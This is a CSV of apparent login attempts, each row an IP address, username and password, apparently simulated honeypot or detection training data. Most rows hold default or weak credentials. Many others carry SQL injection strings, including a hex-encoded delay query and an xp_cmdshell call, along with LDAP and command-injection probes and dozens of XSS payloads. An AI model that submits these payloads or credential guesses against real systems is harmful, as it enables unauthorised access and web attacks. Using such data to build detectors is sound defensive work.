ip,username,password
67.91.75.234,ding,@139.com3721
125.180.128.15,x' or 1=1 or 'x'='y,or 0=0 #
151.240.101.171,cxsdk,CDEMOUCB
234.26.240.139,cui,@163.com666
209.138.114.179,OLAPDBA,m9ff.QW
39.111.41.62,' or 0=0 --,') or ('a'='a
128.165.215.15,%2A%7C,limit
40.186.220.74,deng,Nv-94
151.240.101.171,cxsdk,hockey
209.138.114.179,OLAPDBA,BASE
40.186.220.74,deng,Nov-94
123.185.14.109,hqadmin,1234admin
125.180.128.15,' or username like '%,\x27\x6F\x72 SELECT *
234.26.240.139,cui,@163.com666
196.134.157.27,tian,1/3connect
128.165.215.15,replace,' or username like '%
67.91.75.234,ding,@13.com3721
39.111.41.62,|,"<>""'%;)(&+"
151.240.101.171,cxsdk,qxcommsupport
234.26.240.139,cui,@163.com666
125.180.128.15,",@variable",' UNION SELECT
123.185.14.109,hqadmin,2580
196.134.157.27,tian,1/3connectg
67.91.75.234,ding,@139.com3721
39.111.41.62,' (select top 1,PRINT @@variable
40.186.220.74,deng,Nov-94
209.138.114.179,PORTAL30,taylor
62.94.60.181,"<FRAMESET><FRAME SRC=""javascript:alert(1673);""></FRAMESET>","<STYLE>.XSS{background-image:url(""javascript:alert(1664)"");}</STYLE><A CLASS=XSS></A>"
151.240.101.171,cxsdk,qwertyuiop
196.134.157.27,tian,1/3connect
234.26.240.139,han,.org4444444
62.94.60.181,"<TABLE BACKGROUND=""javascript:alert(760)"">","<STYLE>.XSS{background-image:url(""javascript:javascript:alert(688)"");}</STYLE><A CLASS=XSS></A>"
125.180.128.15,23 OR 1=1,' UNION SELECT
67.91.75.234,ding,@139.com3721
209.138.114.179,PORTAL30,ORAREGSYS
123.185.14.109,LIBRARY,masterkey
39.111.41.62,delete,|
40.186.220.74,deng,Nov-94
151.240.101.171,mtcl,admn
125.180.128.15,' or a=a--,' or 0=0 --
62.94.60.181,"<IMG STYLE=""xss:expr/*XSS*/ession(alert(747))"">","ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(415)"">DEF"
234.26.240.139,han,.org4444444
196.134.157.27,tian,1/3connect
39.111.41.62,%20$(sleep%2050),or 0=0 --
67.91.75.234,ding,@139.com371
123.185.14.109,LIBRARY,console
209.138.114.179,PORTAL30,secret
40.186.220.74,deng,Nov-94
151.240.101.171,mtcl,NETBASE
62.94.60.181,<script>({0:#0=eval/#0#/#0#(javascript:alert(1563))})</script>,<SCRIPT onreadystatechange=javascript:javascript:alert(1614);></SCRIPT>
234.26.240.139,han,.org4444444
196.134.157.27,tian,1/3connect
125.180.128.15,' or username like '%,admin'--
123.185.14.109,LIBRARY,qweasdzxc
209.138.114.179,PORTAL30,!manage
39.111.41.62,' aND '' like '%,limit
40.186.220.74,deng,Nov-94
67.91.75.234,ding,@139.com3721
151.240.101.171,mtcl,BC4J
196.134.157.27,tian,1/3connect
234.26.240.139,han,.org4444444
125.180.128.15,PRINT @@variable,' or uname like '%
62.94.60.181,"<meta content=""&NewLine; 1686 &NewLine;; JAVASCRIPT&colon; alert(1686)"" http-equiv=""refresh""/>",<a onmouseover=alert(1000)>xxs link</a>
209.138.114.179,PORTAL30,infrant1
40.186.220.74,deng,NovH-94
123.185.14.109,LIBRARY,browsepw
67.91.75.234,ding,@139.com3721
39.111.41.62,%26,'%20or%201=1
151.240.101.171,mtcl,SMDR
62.94.60.181,"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1198)""></frameset onScroll>",echo('IPT&gt;alert(913)&lt;/SCRIPT&gt;'); ?&gt;
196.134.157.27,tian,1/3connect
234.26.240.139,han,.org4444444
125.180.128.15,' ;,*(|(mail=*))
123.185.14.109,LIBRARY,jasperadmin
40.186.220.74,deng,Nov-94
209.138.114.179,PORTAL30,netscreen
39.111.41.62,'hi' or 'x'='x';,' or 3=3
67.91.75.234,ding,@139.com372-1
151.240.101.171,mtcl,toor
62.94.60.181,%BCscript%BEalert(1822)%BC/script%BE,<brute oncopy=alert(175)>copy this!
234.26.240.139,han,.org4444444
196.134.157.27,tian,1/3connect
125.180.128.15,as,or%201=1 --
123.185.14.109,LIBRARY,sys123
39.111.41.62,hi') or ('a'='a,declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
40.186.220.74,deng,Nov-94
67.91.75.234,ding,@139.com3721
209.138.114.179,PORTAL30,SMDR
151.240.101.171,mtcl,COMPANY
234.26.240.139,han,.org4444444
196.134.157.27,tian,1/3connect
125.180.128.15,'sqlattempt1,&
62.94.60.181,"perl -e 'print \""&lt;SCR\0IPT&gt;alert(920)&lt;/SCR\0IPT&gt;\"";' &gt; out","<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http://;URL=javascript:alert(1747);\"">"
209.138.114.179,PORTAL30,asd123456789
123.185.14.109,LIBRARY,pwPower
39.111.41.62,a' or 1=1--,#
67.91.75.234,ding,@139.com3721
40.186.220.74,deng,Nov-94
151.240.101.171,mtcl,db2pw
196.134.157.27,tian,1/3connect
234.26.240.139,han,.org4444444
123.185.14.109,LIBRARY,root
125.180.128.15,or 0=0 --,replace
62.94.60.181,<script>alert(1713);</script>,<img src=`%00`&NewLine; onerror=alert(769)&NewLine;
39.111.41.62,as,//
209.138.114.179,csadmin,SYMPA
67.91.75.234,ding,@139.com3721
40.186.220.74,deng,zNov-94
151.240.101.171,ftp_nmc,QLogic66
196.134.157.27,tian,1/3connect
234.26.240.139,han,.org4444444
40.186.220.74,cheng,222222222c++
164.155.50.86,han,wkn976403;
67.91.75.234,ding,@139.com3721
62.94.60.181,"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(417)"">DEF",<svg><script onlypossibleinopera:-)> alert(833)
209.138.114.179,csadmin,klv123
123.185.14.109,LIBRARY,ARCHIVIST
125.180.128.15,%20$(sleep%2050),' or '1'='1'--
151.240.101.171,ftp_nmc,weblogic1
234.26.240.139,han,.org4444444
196.134.157.27,tian,1/3connect
125.180.128.15,update,or%201=1 --
123.185.14.109,LIBRARY,x40rocks
164.155.50.86,han,wkn976403;
209.138.114.179,csadmin,SAPR3
67.91.75.234,ding,@139.com3721
62.94.60.181,"<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1583)>","<svg onUnload svg onUnload=""javascript:javascript:alert(1226)""></svg onUnload>"
40.186.220.74,cheng,222222222c++
151.240.101.171,ftp_nmc,19920706
196.134.157.27,tian,1/3connect
234.26.240.139,han,.org4444444
62.94.60.181,"ABC<div style=""x:\x0Aexpression(javascript:alert(1311)"">DEF","<script src=1192 href=1192 onerror=""javascript:alert(1192)""></script>"
67.91.75.234,ding,@139.com3721
209.138.114.179,csadmin,sangfor
123.185.14.109,ARCHIVIST,Zte521
125.180.128.15,"""' or 1 --'""",or%201=1
40.186.220.74,cheng,222222222c++
164.155.50.86,han,wkn976403;
151.240.101.171,ftp_nmc,solarfocus
234.26.240.139,han,.org4444444
187.109.12.5,mei,xxSy4Dy6d1LK.
40.186.220.74,cheng,222222222c++
164.155.50.86,han,wkn976403;
62.94.60.181,&lt;IMG SRC=&quot;jav&#x09;ascript:alert(1847);&quot;&gt;,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert(737);"">"
123.185.14.109,ARCHIVIST,Huawei13#$
209.138.114.179,csadmin,sysadmpw
33.50.170.191,dev,resumix
67.91.75.234,ding,@139.com3721
151.240.101.171,ftp_nmc,1q2w3e4r
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,han,.org4444444
209.138.114.179,csadmin,nsi
164.155.50.86,han,wkn976403;
123.185.14.109,ARCHIVIST,logapp
40.186.220.74,cheng,222222222c++
62.94.60.181,"`""'><img src=xxx:x onerror\x0B=javascript:alert(554)>","<TABLE BACKGROUND=""javascript:alert(760)"">"
33.50.170.191,dev,a
67.91.75.234,ding,@139.com3721
151.240.101.171,ftp_nmc,autocad
234.26.240.139,han,.org4444444
187.109.12.5,mei,xxSy4Dy6d1LK.
62.94.60.181,"`""'><img src=xxx:x \x0Conerror=javascript:alert(497)>","ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(424)"">DEF"
118.13.144.244,"<body onLoad body onLoad=""javascript:javascript:alert(307)""></body onLoad>","<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(580)//#"">XXX</a></body>"
40.186.220.74,cheng,222222222c++
33.50.170.191,dev,mlusr
164.155.50.86,han,wkn976403;
123.185.14.109,ARCHIVIST,PORTAL31
67.91.75.234,ding,@139.com3721
151.240.101.171,ftp_nmc,dmr99
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,han,.org4444444
123.185.14.109,ARCHIVIST,SECAdmin1
118.13.144.244,"<img \x600600src=x onerror=""javascript:alert(600)"">","""`'><script>\x2Bjavascript:alert(516)</script>"
62.94.60.181,"<math href=""javascript:javascript:alert(1486)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1486)"">CLICKME</maction> </math>","<a href=""\xE2\x80\x80javascript:javascript:alert(1342)"" id=""fuzzelement1342"">test</a>"
40.186.220.74,cheng,222222222c++
164.155.50.86,han,wkn976403;
33.50.170.191,dev,FOOBAR
67.91.75.234,ding,@139.com3721
151.240.101.171,ftp_nmc,adm
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,han,.org4444444
62.94.60.181,"<? foo=""><script>alert(964)</script>"">",<x onmousedown=alert(167)>click this!
123.185.14.109,ARCHIVIST,dbpass
118.13.144.244,"<DIV STYLE=""width: expression(alert(259));"">","`""'><img src=xxx:x onerror\x00=javascript:alert(1469)>"
40.186.220.74,cheng,2^22222222c++
33.50.170.191,dev,telus99
164.155.50.86,han,wkn976403;
221.91.129.166,nie,.net770880
151.240.101.171,ftp_nmc,TJM
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,han,.org4444444
33.50.170.191,pmd,changeme!
40.186.220.74,cheng,222222222c++
123.185.14.109,rje,leadsec.waf
164.155.50.86,han,wkn976403;
62.94.60.181,<IMG SRC=&{javascript:alert(707);};>,"""`'><script>\x0Ajavascript:alert(519)</script>"
118.13.144.244,"<IMG SRC=x ondragenter=""alert(1097))"">","<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert(1049);+ADw-/SCRIPT+AD4-"
221.91.129.166,nie,.net770880
151.240.101.171,ftp_nmc,redips
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,han,.org4444444
62.94.60.181,"<STYLE>.XSS{background-image:url(""javascript:alert(1664)"");}</STYLE><A CLASS=XSS></A>","<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(636)></a>"">"
40.186.220.74,cheng,222222222c++
118.13.144.244,"<IFRAME SRC=""javascript:alert(757);""></IFRAME>",</style &#32;><script &#32; :-(>/**/alert(815)/**/</script &#32; :-(
123.185.14.109,rje,MXAGENT
33.50.170.191,pmd,asd
164.155.50.86,han,wkn976403;
221.91.129.166,nie,.net770880
151.240.101.171,sysbin,xbox
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,han,.org4444444
40.186.220.74,cheng,222222222c++
62.94.60.181,"<BASE HREF=""javascript:alert(1679);//"">","<IMG SRC=""javascript.:alert(234);"">"
118.13.144.244,"""`'><script>\x2531javascript:alert(531)</script>","<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(874)</script>"">"
164.155.50.86,han,wkn976403;
123.185.14.109,rje,123456abc.
33.50.170.191,pmd,primeos
221.91.129.166,nie,.net770880
151.240.101.171,sysbin,Admin@huawei
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,han,.org4444444
123.185.14.109,rje,camera
40.186.220.74,cheng,222222222c++
118.13.144.244,"`""'><img src=xxx:x onerror\x0A=javascript:alert(559)>",654<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x4654vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(654)&gt;`>
164.155.50.86,han,wkn976403;
62.94.60.181,"<a href=""\x1346Ajavascript:javascript:alert(1346)"" id=""fuzzelement1346"">test</a>","&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(1858)&gt;"
33.50.170.191,pmd,default
221.91.129.166,nie,.net770880
151.240.101.171,sysbin,michelle
234.26.240.139,han,.org4444444
187.109.12.5,mei,xxSy4Dy6d1LK.
164.155.50.86,han,wkn976403;
123.185.14.109,rje,m9ff.QW
40.186.220.74,cheng,222222222c++
62.94.60.181,"<body onLoad body onLoad=""javascript:javascript:alert(1206)""></body onLoad>",%BCscript%BEalert(1822)%BC/script%BE
33.50.170.191,pmd,live
118.13.144.244,"""`'><script>\x0Djavascript:alert(1401)</script>",</TITLE><SCRIPT>alert(944);</SCRIPT>
221.91.129.166,nie,.net770880
151.240.101.171,sysbin,muze
234.26.240.139,han,.org4444444
187.109.12.5,mei,xxSy4Dy6d1LK.
40.186.220.74,cheng,222222222c++
164.155.50.86,han,wk6n976403;
123.185.14.109,viewer,D@rj33l1ng
62.94.60.181,<STYLE>@im\port'\ja\vasc\ript:alert(260)';</STYLE>,"<a href=""jav&#65ascript:javascript:alert(708)"">test708</a>"
33.50.170.191,pmd,OSP22
118.13.144.244,"<a href=""\xE2\x80\x89javascript:javascript:alert(442)"" id=""fuzzelement442"">test</a>","<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(678);"">"
221.91.129.166,nie,.net770880
151.240.101.171,sysbin,VCSRV
234.26.240.139,han,.org4444444
187.109.12.5,mei,xxSy4Dy6d1LK
33.50.170.191,pmd,isdev
40.186.220.74,cheng,222222222c++
123.185.14.109,viewer,nq
62.94.60.181,<// style=x:expression\28javascript:alert(1559)\29>,"<a href=""javas\x0374cript:javascript:alert(374)"" id=""fuzzelement374"">test</a>"
164.155.50.86,han,wkn76403;
118.13.144.244,"<embed src=""javascript:alert(963)"">",<brute ondrag=alert(179)>drag this!
221.91.129.166,nie,.net770880
198.93.42.8,‘ or 3=3 --,') or ('a'='a
234.26.240.139,han,.org4444444
187.109.12.5,mei,xxSy4Dy6d1LK.
62.94.60.181,<img src ?itworksonchrome?\/onerror = alert(1705),+ADw-script+AD4-alert(974)+ADw-/script+AD4-
118.13.144.244,"""/><img/onerror=\x09javascript:alert(1439)\x09src=xxx:x />","""`'><script>\xE2\x80\x81403javascript:alert(1403)</script>"
164.155.50.86,han,wkn976403;
40.186.220.74,cheng,222222222c++
123.185.14.109,viewer,j322
33.50.170.191,REPORTS_USER,123456a.
221.91.129.166,nie,.net770880
198.93.42.8,%2A%7C,' UNION SELECT
234.26.240.139,luan,china1/3
187.109.12.5,mei,xxSy4Dy6d1LK.
123.185.14.109,viewer,REMOTE
31.106.223.134,SYSTEST_CLIG,zbaaaca
164.155.50.86,han,wkn976403;
33.50.170.191,REPORTS_USER,yesco
40.186.220.74,cheng,222222222c++
118.13.144.244,"<a style=""-o-link:'javascript:javascript:alert(1554)';-o-link-source:current"">X","<video onerror=""javascript:javascript:alert(1483)""><source>"
221.91.129.166,nie,.net770880
198.93.42.8,handler,x' or 1=1 or 'x'='y
234.26.240.139,luan,china1/3
187.109.12.5,mei,xxSy4Dy6d1LK.
40.186.220.74,cheng,2222v22222c++
118.13.144.244,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(732)>",<math><brute xlink:href=javascript:alert(218)>click
123.185.14.109,viewer,QDBA
31.106.223.134,SYSTEST_CLIG,ABCD
164.155.50.86,han,wkn976403;
33.50.170.191,REPORTS_USER,iloveyou
221.91.129.166,nie,.net770880
198.93.42.8,%29,or
234.26.240.139,luan,chna1/3
187.109.12.5,mei,xxSy4Dy6d1LK.
31.106.223.134,SYSTEST_CLIG,PROG
118.13.144.244,"<iframe src iframe src=""javascript:javascript:alert(348)""></iframe src>",1570<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1570) strokecolor=white strokeweight=1570000px from=0 to=1570000 /></a>
123.185.14.109,support,col1ma
164.155.50.86,han,wkn976403;
40.186.220.74,cheng,222222222c++
33.50.170.191,REPORTS_USER,HOST
221.91.129.166,nie,.net770880
198.93.42.8,'sqlattempt1,|
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,luan,china1/3
40.186.220.74,cheng,222222222c++
33.50.170.191,REPORTS_USER,PAPER
31.106.223.134,SYSTEST_CLIG,pass1
123.185.14.109,support,dbpass
118.13.144.244,"<svg onResize svg onResize=""javascript:javascript:alert(294)""></svg onResize>","ABC<div style=""x:\x00expression(javascript:alert(1324)"">DEF"
164.155.50.86,han,wkn976403;
221.91.129.166,nie,.net770880
198.93.42.8,having,limit
234.26.240.139,luan,china1/3
187.109.12.5,mei,xxSy4Dy6d1LK.
123.185.14.109,support,123abc
40.186.220.74,cheng,222222222c++
31.106.223.134,SYSTEST_CLIG,ftp
33.50.170.191,REPORTS_USER,leaves
118.13.144.244,"<script charset=""\x22>javascript:alert(1256)</script>","<a href=""\xE2\x80\x88javascript:javascript:alert(441)"" id=""fuzzelement441"">test</a>"
164.155.50.86,han,wkn976403;
221.91.129.166,nie,.net770880
198.93.42.8,' or uname like '%,PRINT
234.26.240.139,luan,china1/3
187.109.12.5,mei,xxSy4Dy6d1LK.
33.50.170.191,REPORTS_USER,advcomm500349
118.13.144.244,"&lt;IMG \""\""\""&gt;&lt;SCRIPT&gt;alert(927)&lt;/SCRIPT&gt;\""&gt;","<a href=""\x4569javascript:javascript:alert(456)"" id=""fuzzelement456"">test</a>"
123.185.14.109,support,abcABC123
40.186.220.74,cheng,222222222c++
31.106.223.134,developers,elux
164.155.50.86,han,wkn976403;
221.91.129.166,nie,.net770880
198.93.42.8,exec sp,' UNION SELECT
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,luan,china1/3
31.106.223.134,developers,secure
40.186.220.74,cheng,222222222c++
123.185.14.109,support,O&m15213
33.50.170.191,technician,radius
118.13.144.244,<input autofocus onblur=alert(150)>,"<IFRAME SRC=""javascript:javascript:alert(680);""></IFRAME>"
164.155.50.86,han,wkn976403;
221.91.129.166,nie,.net770880
198.93.42.8,*|,' or a=a--
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,luan,china1/3
118.13.144.244,"<div id=""div584""><input value=""``onmouseover=javascript:alert(584)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div584"").innerHTML;</script>","""`'><script>\xE2\x80\x84javascript:alert(1404)</script>"
123.185.14.109,support,comcomcom
40.186.220.74,cheng,222222222c++
33.50.170.191,technician,lp
31.106.223.134,developers,WWWUSER
164.155.50.86,han,wkn976403;
221.91.129.166,nie,.net770880
198.93.42.8,char%4039%41%2b%40SELECT,' or 1=1
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,luan,china1/3
123.185.14.109,ftp_oper,2000
40.186.220.74,cheng,222222222c++
31.106.223.134,developers,asecret
118.13.144.244,"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1290);}</script>",">""'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(1944)>"
33.50.170.191,technician,abc123
221.91.129.166,nie,.net770880
164.155.50.86,han,wkn976403;
198.93.42.8,tz_offset,) and (1=1
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,luan,china1/3
40.186.220.74,cheng,222222222c++
31.106.223.134,developers,Zenith
33.50.170.191,technician,tiger123
123.185.14.109,ftp_oper,SECDEMO
118.13.144.244,"ABC<div style=""x:exp\x5Cression(javascript:alert(411)"">DEF","<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(383)//></style>"
164.155.50.86,han,wkn976403;
221.91.129.166,nie,.net770880
198.93.42.8,' or 1=1 or ''=',‘ or 1=1 --
234.26.240.139,luan,china1/3
187.109.12.5,mei,xxSy4Dy6d1LK.
123.185.14.109,ftp_oper,IS_$hostname
31.106.223.134,developers,pwpw
33.50.170.191,technician,AIMS
118.13.144.244,"<a href=""\xE1337\xA0\x8Ejavascript:javascript:alert(1337)"" id=""fuzzelement1337"">test</a>",<// style=x:expression\28javascript:alert(645)\29>
40.186.220.74,cheng,222222222c++
164.155.50.86,han,wkn976403;
221.91.129.166,nie,.net770880
198.93.42.8,= ;,%2A%7C
234.26.240.139,luan,china1/3
187.109.12.5,mei,xSy4Dy6d1LK.
33.50.170.191,technician,QS_CS
118.13.144.244,"<STYLE>.XSS{background-image:url(""javascript:javascript:alert(688)"");}</STYLE><A CLASS=XSS></A>",&lt;BODY BACKGROUND=&quot;javascript:alert(1809);&quot;&gt;
31.106.223.134,developers,repair
40.186.220.74,cheng,222222222c++
123.185.14.109,ftp_oper,AP
79.95.142.37,systemd-bus-proxy,restoreonly1
221.91.129.166,nie,.net770880
198.93.42.8,handler,PRINT
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,luan,china1w3
31.106.223.134,hscroot,tslinux
33.50.170.191,technician,asd
40.186.220.74,cheng,222222222c++
118.13.144.244,"<a onmouseover=""alert(719)"">xxs link</a>","<body onResize body onResize=""javascript:javascript:alert(1229)""></body onResize>"
123.185.14.109,ftp_oper,hello
79.95.142.37,systemd-bus-proxy,juniper123
221.91.129.166,nie,.net7170880
198.93.42.8,insert,' or userid like '%
187.109.12.5,mei,xxSy4Dy6d1LK.
234.26.240.139,luan,china1/3
123.185.14.109,ftp_oper,syspw
118.13.144.244,<script\x0D>javascript:alert(549)</script>,"<TABLE BACKGROUND=""javascript:javascript:alert(1595)"">"
31.106.223.134,hscroot,3ware
1.158.151.36,qin,j6ap7o.ofl
33.50.170.191,technician,GUESTGUEST
79.95.142.37,systemd-bus-proxy,admin112233
221.91.129.166,nie,.net770880
198.93.42.8,procedure,a'
68.114.100.96,ceng,100%wwwwwww
234.26.240.139,luan,china1/3
54.151.15.157,\x27UNION SELECT,hi' or 1=1 --
31.106.223.134,hscroot,WORD
1.158.151.36,qin,jr6ap7o.ofl
123.185.14.109,1234,Col2ogro2
33.50.170.191,backuponly,managers
79.95.142.37,systemd-bus-proxy,HELGA-S
221.91.129.166,nie,.net770880
198.93.42.8,exec sp,replace
68.114.100.96,ceng,100%wwww^www
234.26.240.139,luan,china1/3
1.158.151.36,qin,j6ap7o.ofl
54.151.15.157,to_timestamp_tz,insert
31.106.223.134,hscroot,prtgadmin
123.185.14.109,1234,321123
33.50.170.191,backuponly,adminpass
221.91.129.166,nie,.net770880
79.95.142.37,systemd-bus-proxy,nq
198.93.42.8,' and '' like ''--,*/*
68.114.100.96,ceng,100%wwwwwww
234.26.240.139,luan,china1/3
33.50.170.191,backuponly,george
54.151.15.157,to_timestamp_tz,*|
1.158.151.36,qin,j6ap7o.ofl
123.185.14.109,1234,66666
31.106.223.134,hscroot,123
221.91.129.166,nie,.net770880
79.95.142.37,systemd-bus-proxy,q1w2e3
198.93.42.8,'sqlattempt1,procedure
234.26.240.139,luan,china1/3
68.114.100.96,ceng,100%wwwwwww
123.185.14.109,1234,hawk201
1.158.151.36,qin,j6ap7o.ofl
31.106.223.134,hscroot,asd12345678
33.50.170.191,backuponly,SENTINEL
54.151.15.157,PRINT @@variable,= ;
221.91.129.166,nie,.net770880
79.95.142.37,systemd-bus-proxy,R1QTPS
198.93.42.8,PRINT @@variable,%28
68.114.100.96,ceng,100%wwwwwww
234.26.240.139,luan,china1/3
54.151.15.157,or 0=0 --,0 or 1=1
123.185.14.109,1234,CHANGE_ON_INSTALL
31.106.223.134,hscroot,klaster
1.158.151.36,qin,j6ap7o.ofl
33.50.170.191,backuponly,#l@$ak#.lk;0@P
13.151.179.132,"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1692)&NewLine;>X</a>","<FRAMESET><FRAME SRC=""javascript:alert(948);""></FRAMESET>"
79.95.142.37,systemd-bus-proxy,PORTAL30
103.159.203.9,%20$(sleep%2050),' and '' like '
68.114.100.96,ceng,100%wwwwwww
234.26.240.139,luan,china1/3
31.106.223.134,hscroot,h6BB
1.158.151.36,qin,j6ap7o.ofl
33.50.170.191,backuponly,year2000
54.151.15.157,' and 2>1--,asc
123.185.14.109,1234,DBA!sa@EMSDB123
79.95.142.37,admin01,QS
103.159.203.9,),' or uid like '%
13.151.179.132,<input onfocus=javascript:alert(1477) autofocus>,"<div/onmouseover='alert(835)'> style=""x:"">"
234.26.240.139,luan,china1/3
68.114.100.96,ceng,100%wwwwwww
1.158.151.36,qin,j6ap7o.ofl
31.106.223.134,computer,xbox
177.152.241.27,"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1550)></a>"">","<IMG SRC="" &#14;  javascript:alert(1645);"">"
54.151.15.157,%2A%28%7C%28mail%3D%2A%29%29,= ;
33.50.170.191,backuponly,AM
103.159.203.9,x' or 1=1 or 'x'='y,t'exec master..xp_cmdshell 'nslookup www.google.com'--
79.95.142.37,admin01,test2
13.151.179.132,"<script src=""data:\xD4\x8F,javascript:alert(397)""></script>","""><script>alert(1868)</script>"
